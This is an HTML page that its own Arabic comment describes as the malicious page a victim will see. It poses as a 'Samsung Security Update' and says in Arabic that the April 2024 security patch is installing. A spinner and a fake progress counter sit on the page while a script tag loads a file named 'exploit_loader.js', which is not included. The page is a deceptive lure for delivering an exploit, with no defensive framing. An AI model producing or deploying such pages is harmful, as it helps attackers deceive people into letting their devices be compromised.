<!-- index.html - الصفحة الضارة التي سيراها الضحية -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samsung Security Update</title>
    <style>
        body {
            background: #1a1a2e;
            color: white;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .update-box {
            background: #16213e;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
        }
        .spinner {
            border: 4px solid #0f3460;
            border-top: 4px solid #e94560;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #e94560;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="update-box">
        <h2>⏳ تحديث أمان Samsung</h2>
        <p>جاري تثبيت التصحيح الأمني لشهر أبريل 2024</p>
        <div class="spinner"></div>
        <div class="status" id="status">0%</div>
    </div>

    <script src="exploit_loader.js"></script>
</body>
</html>
